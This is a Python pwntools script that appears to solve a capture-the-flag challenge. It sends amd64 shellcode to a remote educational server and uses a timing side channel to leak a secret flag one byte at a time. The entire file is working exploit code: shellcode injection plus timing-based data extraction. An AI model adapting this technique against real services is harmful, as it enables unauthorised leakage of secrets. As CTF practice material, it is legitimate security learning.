import pwn
import time

pwn.context.arch = "amd64"

offset = 0x001013dc - 0x00104040

def pwn_char_by_char(ith, char_ascii):
    shellcode = pwn.asm(
        f"""
        mov rbx, qword ptr[rsp]
        sub rbx, {offset - ith}
        mov rax, qword ptr [rbx]
        cmp al, {hex(char_ascii)}
        jne $ - 0x4
        mov rax, 0x3c
        xor rdi, rdi
        syscall
        """
    )

    r = pwn.remote("edu-ctf.zoolab.org", 10002)
    r.recvuntil(b"talk is cheap, show me the code")
    r.send(shellcode)
    
    t1 = time.time()
    try:
        r.recvall(timeout=1)
    except Exception:
        pass
    
    # if elapsed time smaller than 0.5: correct
    return time.time() - t1 < 0.5

flag = ""
for i in range(0, 0x30):
    print(f"Guessing {i} th char")
    # printable ascii
    for j in range(0x20, 0x7f):
        if pwn_char_by_char(i, j):
            flag += chr(j)
            print("hit", chr(j))
            break

print(flag)